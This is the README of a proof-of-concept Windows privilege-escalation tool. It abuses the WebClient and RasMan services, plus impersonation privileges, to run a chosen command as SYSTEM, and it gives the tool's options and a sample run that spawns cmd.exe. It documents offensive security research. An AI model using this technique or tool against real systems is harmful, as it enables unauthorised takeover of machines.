# ChimichurriReloaded

This is a hastily put together PoC based entirely on the following blog post: https://itm4n.github.io/chimichurri-reloaded/

Basically, it's another way to get SYSTEM with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege.  Some caveats, since it uses HTTP it does require the target to have the WebClient service installed.  This is installed by default on workstations, but not on servers.  This PoC will check for the presence of WebClient, start it if it's not already started, and attempt to trigger the vulnerability.  There are probably better ways to trigger RasMan to attempt to write to the trace file but I chose to write out a phonebook with a VPN connection and leverage rasdial to attempt to connect and trigger the attempted write.  As always, YMMV.

## Usage

```
C:\Users\reigningshells>ChimichurriReloaded.exe --help
ChimichurriReloaded 1.0.0.0
Copyright c  2020

  -p, --port                   (Default: 9876) Set local HTTP listening port.

  -c, --command                (Default: C:\Windows\System32\cmd.exe) Command to run as SYSTEM

  -a, --arguments              Arguments to pass to command you wish to run as SYSTEM.

  -u, --createprocessasuser    (Default: CreateProcessWithToken) Use CreateProcessAsUser with SeAssignPrimaryToken
                               privilege.

  -v, --verbose                Set output to verbose messages.

  --help                       Display this help screen.

  --version                    Display version information.
```

## Example
```
C:\Users\reigningshells>ChimichurriReloaded.exe -p 9999 -c "c:\windows\system32\cmd.exe" -v
[+] Starting HttpImpersonator...
[+] WebClient already running...
[+] RasMan service already running, attempting to trigger a write to the trace file...
[+] Process spawned with impersonated token...
[+] Cleaning up registry...
```
